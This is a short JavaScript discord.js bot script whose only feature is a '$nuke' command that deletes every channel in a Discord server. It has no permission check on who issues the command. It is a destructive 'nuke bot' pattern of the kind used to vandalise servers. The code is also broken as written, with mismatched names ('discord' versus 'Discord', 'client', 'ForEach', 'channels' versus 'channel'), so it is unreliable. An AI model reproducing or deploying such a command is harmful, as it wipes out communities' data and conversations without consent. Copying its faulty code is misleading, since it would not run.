const discord = require('discord.js');
const client = new Discord.client();


client.login(process.env.TOKEN)


client.on('message', async (message) => {
  if (message.content === '$nuke') {
    message.guild.channels.cache.ForEach(channels => channel.delete());
   
  }
})